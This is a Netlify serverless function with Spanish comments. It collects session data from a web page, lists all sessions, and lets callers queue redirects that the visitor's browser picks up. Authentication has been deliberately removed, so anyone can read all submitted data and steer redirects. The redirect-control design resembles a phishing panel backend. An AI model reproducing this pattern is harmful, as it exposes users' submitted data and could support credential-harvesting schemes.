// Netlify Function CORREGIDA - Rutas optimizadas para Netlify
// Solo Node.js nativo, optimizada para deploy rápido

let sessions = {};
let redirectCommands = {};

exports.handler = async (event, context) => {
    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type,Authorization',
        'Access-Control-Allow-Methods': 'GET,POST,OPTIONS'
    };

    // CORS preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers: corsHeaders,
            body: ''
        };
    }

    try {
        // Parsear body si existe
        let body = {};
        if (event.body) {
            try {
                body = JSON.parse(event.body);
            } catch (e) {
                body = {};
            }
        }

        const path = event.rawPath; // Usar rawPath para obtener la ruta completa
        const method = event.httpMethod;

        console.log('Debug:', { method, path, body }); // Log para debugging

        // POST / - Crear/actualizar sesión (cuando viene desde index5-green.html)
        if (method === 'POST' && path === '/') {
            if (!body.sessionId) {
                return response(400, { error: 'sessionId requerido' }, corsHeaders);
            }

            sessions[body.sessionId] = {
                ...body,
                lastActivity: Date.now()
            };

            return response(200, { success: true }, corsHeaders);
        }

        // GET / - Obtener todas las sesiones
        if (method === 'GET' && path === '/') {
            return response(200, Object.values(sessions), corsHeaders);
        }

        // Endpoint /login removido - acceso libre

        // GET /:id - Obtener sesión específica + comandos
        if (method === 'GET') {
            const pathParts = path.split('/').filter(Boolean);
            
            // Si es /sessionId (ej: /test123)
            if (pathParts.length === 1 && pathParts[0] !== 'login') {
                const sessionId = pathParts[0];
                const session = sessions[sessionId];
                const command = redirectCommands[sessionId];

                if (!session) {
                    return response(404, { error: 'No encontrado' }, corsHeaders);
                }

                const responseData = { session };
                if (command) {
                    responseData.redirect_to = command.page;
                    delete redirectCommands[sessionId];
                }

                return response(200, responseData, corsHeaders);
            }
        }

        // POST /redirect - Redirección
        if (method === 'POST' && path === '/redirect') {
            const { sessionId, page, auth } = body;

            // Autorización removida - acceso libre

            if (!sessionId || !page) {
                return response(400, { error: 'Parámetros requeridos' }, corsHeaders);
            }

            redirectCommands[sessionId] = { page };
            return response(200, { success: true }, corsHeaders);
        }

        // Si nada coincide - Endpoint no encontrado
        return response(404, { error: 'Endpoint no encontrado', debug: { method, path } }, corsHeaders);

    } catch (error) {
        console.error('Function Error:', error); // Log error para debugging
        return response(500, { error: 'Error interno del servidor', detail: error.message }, corsHeaders);
    }
};

// Función auxiliar para respuestas
function response(statusCode, data, headers) {
    return {
        statusCode,
        headers: {
            'Content-Type': 'application/json',
            ...(headers || {})
        },
        body: typeof data === 'string' ? data : JSON.stringify(data)
    };
}